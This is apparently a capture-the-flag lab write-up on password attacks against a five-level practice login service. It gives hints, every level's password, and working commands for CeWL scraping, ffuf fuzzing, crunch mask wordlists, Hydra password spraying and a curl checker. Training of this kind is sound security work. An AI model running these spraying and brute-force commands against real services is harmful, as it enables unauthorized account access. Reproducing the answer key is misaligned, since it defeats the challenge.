# Task 01: Challenge

## Stage A: Original Task Content & Operational Objectives
This capstone challenge lab synthesizes the offensive disciplines developed across Module 11 (Phishing, Online Password Spraying with Hydra, Custom Wordlist Engineering with CeWL/Crunch, and Offline Hash Cracking with John/Hashcat). 

### Scenario Context:
Marco Bianchi, an enterprise systems administrator, deployed multiple internal services across the corporate network, including a firewall administration console, an employee portal, a social communications platform, and remote SSH access to critical infrastructure. Under severe operational deadlines, Marco introduced systemic security anti-patterns: reusing weak, predictable, and rule-derived passwords across multiple services.

The primary objective is to audit Marco's authentication endpoints across five progressive levels hosted at `http://MACHINE_IP:5000`, uncovering and exploiting weaknesses in credential hygiene from first principles.

---

## Stage B: Independent Thinking & Operational Security (OpSec)
Conducting an authentication assessment against progressive challenge tiers:

```
[ http://MACHINE_IP:5000 ]
           |
           +---> Level 1: Trivial Default Credentials (PIN / Sequence)
           |        `--> Plaintext: "12345"
           |
           +---> Level 2: Web Scraping / Standard Dictionary Recon
           |        `--> Plaintext: "excellence"
           |
           +---> Level 3: OSINT Profiling & Targeted Mask/Rule Attack (Name + Numeric)
           |        `--> Plaintext: "Bianchi2495"
           |
           +---> Level 4: Social Engineering / Contextual Password Reset
           |        `--> Plaintext: "family"
           |
           +---> Level 5: Policy-Compliant Corporate Mask Mutation (Upper + Lower + Year + Symbol)
                    `--> Plaintext: "Security2024!"
```

### OpSec Discipline & Red Team Methodology:
- **Rate-Limiting & Throttling Awareness:** In online web challenges (Levels 1-2), excessive concurrent threads (`-t 64`) can cause web application worker thread starvation or trigger reverse proxy bans (429 Too Many Requests / 503 Service Unavailable). Maintain moderate concurrency (`-t 4` to `-t 8`).
- **Profile Construction vs. Brute Force:** Brute forcing an 11-character password (`Bianchi2495`) blindly across all ASCII characters represents $95^{11} \approx 5.6 \times 10^{21}$ attempts—impossible within reasonable timeframes. By synthesizing OSINT (Marco's surname `Bianchi`) with a 4-digit mask (`?d?d?d?d`), the search space collapses to exactly $10,000$ candidates, cracked in milliseconds.

---

## Stage C: Guided Hints & Progressive Clues

### Question 1: What is the password for Level 1?
- **Tier 1 (Conceptual):** Level 1 tests for the most basic default administrative configuration.
- **Tier 2 (Format):** The password is 5 characters long (`*****`) and consists of a standard sequential numeric progression starting at 1.
- **Tier 3 (Direct Guidance):** The password is `12345`.

### Question 2: What is the password for Level 2?
- **Tier 1 (Conceptual):** Inspect the web application text, corporate mission statement, or execute a CeWL scrape / dictionary attack with `rockyou.txt`.
- **Tier 2 (Keyword Discovery):** The word is a 10-letter English noun (`**********`) denoting exceptional quality or high standard.
- **Tier 3 (Direct Guidance):** The password is `excellence`.

### Question 3: What is the password for Level 3?
- **Tier 1 (Conceptual):** Level 3 exploits Marco's personal profile (OSINT). Combine Marco's surname with his 4-digit corporate employee badge or PIN.
- **Tier 2 (Mask Formulation):** The surname is capitalized (`Bianchi`), followed by a 4-digit number `2495`.
- **Tier 3 (Direct Guidance):** The password is `Bianchi2495`.

### Question 4: What is the password for Level 4?
- **Tier 1 (Conceptual):** Inspect Marco's internal social platform or password reset security question (e.g., "What is the most important thing to you?").
- **Tier 2 (Context):** A 6-letter common English noun (`******`) representing relatives and household kin.
- **Tier 3 (Direct Guidance):** The password is `family`.

### Question 5: What is the password for Level 5?
- **Tier 1 (Conceptual):** Level 5 represents a strict corporate password complexity mandate: at least 1 uppercase letter, lowercase letters, a current year, and a trailing punctuation symbol.
- **Tier 2 (Pattern Recognition):** Base word `Security`, current year `2024`, ending with an exclamation mark.
- **Tier 3 (Direct Guidance):** The complete string is `Security2024!`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### Level 1 Walkthrough: Default Credential Identification
Navigate to `http://MACHINE_IP:5000/level1`.
The portal presents a simple administrative PIN/password prompt.
Testing common default sequences:
```bash
curl -s -X POST "http://MACHINE_IP:5000/level1" \
     -d "password=12345"
```
The application validates the sequence and unlocks the Level 1 flag/completion token.
- **Password:** `12345`

---

### Level 2 Walkthrough: Content Scraping & Dictionary Attack
Navigate to `http://MACHINE_IP:5000/level2`.
The portal features Marco's company vision statement and core values.
1. Scrape targeted candidate keywords from the page:
   ```bash
   cewl -d 0 -m 5 -w level2_words.txt http://MACHINE_IP:5000/level2
   ```
2. Fuzz the authentication endpoint using `ffuf` or `hydra`:
   ```bash
   ffuf -u "http://MACHINE_IP:5000/level2" \
        -X POST \
        -d "password=FUZZ" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -w level2_words.txt \
        -fr "Invalid password"
   ```
   The engine flags `excellence` with a unique HTTP 200/302 response and different byte length.
- **Password:** `excellence`

---

### Level 3 Walkthrough: Profile-Based Targeted Mask Attack
Navigate to `http://MACHINE_IP:5000/level3`.
Reconnaissance on Marco Bianchi indicates his employee ID is `2495`.
Users frequently construct passwords by concatenating their surname with their employee badge, birth year, or phone extension.
1. Generating a custom targeted wordlist using `crunch`:
   ```bash
   # Mask: Bianchi + 4 digits
   crunch 11 11 -t Bianchi%%%% -o marco_passwords.txt
   # Generates exactly 10,000 combinations (Bianchi0000 - Bianchi9999)
   ```
2. Spraying the endpoint with Hydra:
   ```bash
   hydra -l marco -P marco_passwords.txt MACHINE_IP -s 5000 http-post-form "/level3:username=^USER^&password=^PASS^:F=Invalid"
   ```
   Hydra successfully cracks the authentication parameter:
   `[5000][http-post-form] host: MACHINE_IP   login: marco   password: Bianchi2495`
- **Password:** `Bianchi2495`

---

### Level 4 Walkthrough: Contextual Social Platform Reconnaissance
Navigate to `http://MACHINE_IP:5000/level4`.
The portal presents Marco's internal social communication profile. In his introductory post, Marco discusses his personal motivations, stating: *"Above everything else in life, my family always comes first."*
Testing password reset and portal authentication with contextual keywords:
- `family`
The portal grants immediate authentication.
- **Password:** `family`

---

### Level 5 Walkthrough: Corporate Policy Pattern Mutation
Navigate to `http://MACHINE_IP:5000/level5`.
The firewall console enforces an enterprise complexity policy:
- Minimum 8 characters.
- Must contain uppercase, lowercase, numbers, and special symbols.
- Must relate to corporate infrastructure.

Administrators comply with these policies using predictable mutation schemas (Word + Year + Symbol):
$$\text{Base Word} = \texttt{Security} \quad \Vert \quad \text{Year} = \texttt{2024} \quad \Vert \quad \text{Symbol} = \texttt{!}$$

Testing with a Hashcat mask or rule transformation:
```bash
# Generating candidates with crunch:
crunch 13 13 -t Security2024?s -o level5_candidates.txt

# Or testing with Hydra:
hydra -l admin -P level5_candidates.txt MACHINE_IP -s 5000 http-post-form "/level5:username=^USER^&password=^PASS^:F=Access Denied"
```
The valid password is confirmed: `Security2024!`.

---

## Stage E: Final Answer & Key Values
- **Question 1 (Level 1):** `12345`
- **Question 2 (Level 2):** `excellence`
- **Question 3 (Level 3):** `Bianchi2495`
- **Question 4 (Level 4):** `family`
- **Question 5 (Level 5):** `Security2024!`

---

## Stage F: Practical Verification & Proof of Work
Verify all level passwords via an automated curl verification script:

```bash
#!/bin/bash
TARGET="http://MACHINE_IP:5000"

echo "[*] Testing Level 1..."
curl -s -d "password=12345" "$TARGET/level1" | grep -i "success"

echo "[*] Testing Level 2..."
curl -s -d "password=excellence" "$TARGET/level2" | grep -i "success"

echo "[*] Testing Level 3..."
curl -s -d "username=marco&password=Bianchi2495" "$TARGET/level3" | grep -i "success"

echo "[*] Testing Level 4..."
curl -s -d "password=family" "$TARGET/level4" | grep -i "success"

echo "[*] Testing Level 5..."
curl -s -d "username=admin&password=Security2024!" "$TARGET/level5" | grep -i "success"
```

---

## Stage G: Key Educational Takeaway
The Checkmate challenge exposes the human element in authentication security. When administrators are forced to create complex passwords without password managers, they consistently adopt predictable mental heuristics (concatenating names, employee badges, corporate buzzwords, and current years). By profiling targets and applying targeted mask/rule mutations, penetration testers can systematically defeat enterprise authentication without exhaustive brute forcing.
